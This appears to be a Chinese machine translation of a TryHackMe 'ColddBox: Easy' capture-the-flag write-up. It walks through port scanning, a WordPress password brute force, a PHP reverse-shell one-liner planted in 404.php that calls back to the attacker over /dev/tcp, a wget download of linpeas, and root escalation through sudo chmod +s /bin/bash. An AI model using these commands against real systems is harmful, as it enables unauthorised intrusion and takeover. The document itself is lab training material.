<html>
<head>
<title>TryHackMe: ColddBox:Easy Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">try hackme:cold box:简单编写</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-colddbox-easy-write-up-2bb4d113b79d?source=collection_archive---------1-----------------------#2021-01-17">https://infosecwriteups.com/tryhackme-colddbox-easy-write-up-2bb4d113b79d?source=collection_archive---------1-----------------------#2021-01-17</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/e81a8134e0b5cd6fcf2761fbf6bcf27e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gAxGh-DmM_B2rSMO.png"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">简单级CTF挑战</figcaption></figure><p id="ecca" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们启动<a class="ae ld" href="https://tryhackme.com/room/colddboxeasy" rel="noopener ugc nofollow" target="_blank">机</a>开始黑吧！！！。</p><p id="2a64" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">连接到您的OpenVPN网络并部署机器。</p><h2 id="8eb8" class="le lf it bd lg lh li dn lj lk ll dp lm kq ln lo lp ku lq lr ls ky lt lu lv lw bi translated">任务1 boot2Root</h2><p id="d6e7" class="pw-post-body-paragraph kf kg it kh b ki lx kk kl km ly ko kp kq lz ks kt ku ma kw kx ky mb la lb lc im bi translated">首先，让我们使用<a class="ae ld" href="https://github.com/RustScan/RustScan" rel="noopener ugc nofollow" target="_blank"> Rustscan </a>扫描机器中的开放端口。</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="f81c" class="le lf it mh b gy ml mm l mn mo">rustscan -a &lt;machine-ip&gt;</span></pre><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mp"><img src="../Images/9a175a845c79db5d9ddf26e40a32504a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yrA4-XRd-_AJ49DnsP6QNw.png"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">rustscan结果</figcaption></figure><p id="5ff1" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们可以看到只有两个端口是打开的，80(http)和4512。让我们来探索一下。</p><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mq"><img src="../Images/64dac369890500df515d5754e579bffb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*093dqccOYI-2yDcrKIEGdg.png"/></div></div></figure><p id="a6c8" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">这个页面属于wordpress。使用GoBuster让我们找到隐藏的网页</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="27ab" class="le lf it mh b gy ml mm l mn mo">gobuster dir -u http://&lt;machine-ip&gt; -w &lt;wordlist&gt;</span></pre><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mr"><img src="../Images/1e2f920e7bb457b131b23fcc83d6d9ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1nl3XTbnY5GrUyiSvU-6DQ.png"/></div></div></figure><p id="7118" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们发现了一些秘密。</p><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ms"><img src="../Images/df1a3b44f99904ea793d02cefee7a286.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SynKmIBf6YE0oxW52rTZ3w.png"/></div></div></figure><p id="916b" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">使用wpscan，让我们试着在wordpress页面中找到一些漏洞</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="7ed8" class="le lf it mh b gy ml mm l mn mo">wpscan --url http://&lt;machine-ip&gt;</span></pre><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mq"><img src="../Images/fad7db49b896329c2815807ceb068502.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IuHn_HaDna1vpC94DHAyow.png"/></div></div></figure><p id="7353" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">让我们用暴力迫使密码用户找到密码。</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="0e56" class="le lf it mh b gy ml mm l mn mo">wpscan --url http://&lt;machine-ip&gt; -P &lt;wordlist&gt; -U c0ldd</span></pre><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mq"><img src="../Images/4f31f6f35dfe3337b02ab127dd5533e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DLETVQxgRaCHjwjsdQNKEg.png"/></div></div></figure><p id="f757" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">找到密码后，让我们登录帐户</p><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mt"><img src="../Images/8e344fc7757cb9a4f7fa757b479ee312.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wLv0fxZg-M7k1tdFkgBTzg.png"/></div></div></figure><p id="8c2f" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">账户里没有可疑的东西。所以通过php获得反向外壳。</p><p id="b8ea" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">去外观-&gt;编辑-&gt; 404.php。粘贴php反向shell代码，更新代码。</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="9a75" class="le lf it mh b gy ml mm l mn mo">&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;your-ip-address&gt;/4444 0&gt;&amp;1'");?&gt;</span></pre><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ms"><img src="../Images/9ad9badf65348b2ee5985d4db769ba86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rDJBHpsDIbJvtWCOXded_A.png"/></div></div></figure><p id="d455" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">同时在一个新的终端中打开一个netcat会话来获得shell。</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="2a05" class="le lf it mh b gy ml mm l mn mo">nc -lvp 4444</span></pre><p id="cecd" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">然后在浏览器中进入404.php页面。</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="b90b" class="le lf it mh b gy ml mm l mn mo">http://&lt;machine-ip&gt;/?p=404.php</span></pre><p id="9d30" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">一旦页面加载，我们将在终端中得到相反的外壳</p><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mu"><img src="../Images/375e5b97edec4cfaa8668924a3241b6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JeK6YMJJIT9ZC2EZq94UKg.png"/></div></div></figure><p id="172f" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">目前用户是www-data</p><p id="0653" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">在/home/c0ldd文件夹中，我们可以找到user.txt文件。但由于我们不是c0ldd，我们不能查看旗帜。</p><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mv"><img src="../Images/a9be5768a8f4d7938d078df76e5a2b5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*23MakB5lq3pxTgvE2eShPw.png"/></div></div></figure><p id="eb85" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">让我们运行linpeas.sh来提升我们的特权。在主机上运行服务器。我正在使用apache2并创建一个服务器。</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="6ba3" class="le lf it mh b gy ml mm l mn mo">sudo service apache2 start</span></pre><p id="0973" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">在受害者机器上下载linpeas.sh文件。</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="2347" class="le lf it mh b gy ml mm l mn mo">wget http://&lt;your-ip-address&gt;/linpeas.sh</span></pre><p id="8987" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">更改linpeas的权限并运行它</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="b9ff" class="le lf it mh b gy ml mm l mn mo">chmod +x linpeas.sh<br/>./linpeas.sh</span></pre><figure class="mc md me mf gt ju gh gi paragraph-image"><div class="gh gi mw"><img src="../Images/fc0d823f855ccdab80437d7ae47f74e0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1210/format:webp/1*xiCSbjzSxmiQuhVPQPPgDw.png"/></div></figure><p id="e697" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们得到了Db_password，这样我们就可以打开ssh端口4512</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="7cb6" class="le lf it mh b gy ml mm l mn mo">ssh c0ldd@&lt;machin-ip&gt; -p 4512</span></pre><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mx"><img src="../Images/742d4fe48b41ca3f4a11bc66b744c3e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sjuhf8GejnrFQvv8bS_i-g.png"/></div></div></figure><p id="861f" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">最后我们是c0ldd用户，所以我们可以打开user.txt</p><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi my"><img src="../Images/8f3ad4209570d2c577031b7e7278cbb1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*--ihzUYmCDf4AYdR01dZUQ.png"/></div></div></figure><p id="9b88" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">现在我们必须想办法获取root.txt</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="204a" class="le lf it mh b gy ml mm l mn mo">sudo -l </span></pre><figure class="mc md me mf gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/c15ffe0e47243958fddc5c92dd809fcf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zMwey5XEnMixGAqo3B7GBQ.png"/></div></div></figure><p id="4cdd" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">作为根用户，我们可以执行以上三个命令</p><p id="66a9" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">让我们通过chmod更改bash的权限</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="aa13" class="le lf it mh b gy ml mm l mn mo">sudo chmod +s /bin/bash</span></pre><p id="9c20" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">以下带有-p参数的bash命令将为您提供一个以euid和egid为根的bash shell。</p><pre class="mc md me mf gt mg mh mi mj aw mk bi"><span id="4ccd" class="le lf it mh b gy ml mm l mn mo">/bin/bash -p</span></pre><p id="cff5" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">最后，使用cat命令，我们可以查看根标志。</p><figure class="mc md me mf gt ju gh gi paragraph-image"><div class="gh gi na"><img src="../Images/90a1ee4d8e7fe0db6bc0c054a4413a01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1330/format:webp/1*i4mcCunD8gUY-89PRwq1VA.png"/></div></figure><figure class="mc md me mf gt ju"><div class="bz fp l di"><div class="nb nc l"/></div></figure></div><div class="ab cl nd ne hx nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="im in io ip iq"><p id="cf1e" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">做这个挑战很有趣。希望大家学到新东西:)。</p><p id="44f2" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">通过<a class="ae ld" href="https://www.linkedin.com/in/vishnuram-r/" rel="noopener ugc nofollow" target="_blank"> Linkedin </a>和<a class="ae ld" href="https://vishnuram1999.github.io/" rel="noopener ugc nofollow" target="_blank">我的网站</a>和我联系。</p></div></div>    
</body>
</html>